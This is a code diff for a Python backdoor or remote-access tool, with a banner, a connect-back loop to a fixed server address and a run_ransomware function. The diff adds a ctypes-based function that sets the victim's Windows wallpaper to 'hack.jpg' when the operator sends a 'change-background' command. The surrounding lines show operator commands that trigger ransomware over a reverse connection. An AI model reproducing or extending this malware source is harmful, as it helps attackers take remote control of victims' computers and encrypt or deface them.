@@ -9,6 +9,7 @@ SERVER_URL = "http://192.168.88.105:2020"
 import shlex
 import pyautogui
 import random
+import ctypes
 banner = r"""
 ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
@@ -41,6 +42,19 @@ banner = r"""
       - Clear console.
 =====================================================
 """
+def set_wallpaper(file):
+    SPI_SETDESKWALLPAPER = 20
+    if hasattr(sys, "_MEIPASS"):
+        base_path = sys._MEIPASS
+    else:
+        base_path = os.path.dirname(os.path.abspath(__file__))
+    image_path = os.path.join(base_path, file)
+    ctypes.windll.user32.SystemParametersInfoW(
+        SPI_SETDESKWALLPAPER,
+        0,
+        image_path,
+        3
+    )
 def run_ransomware():
     if hasattr(sys, "_MEIPASS"):
         base_path = sys._MEIPASS
@@ -302,6 +316,7 @@ def connect_back():
                 run_ransomware()
                 continue
             if cmd.lower() == "change-background":
+                set_wallpaper("hack.jpg")
                 continue
             if cmd.lower() == "exit":
                 break
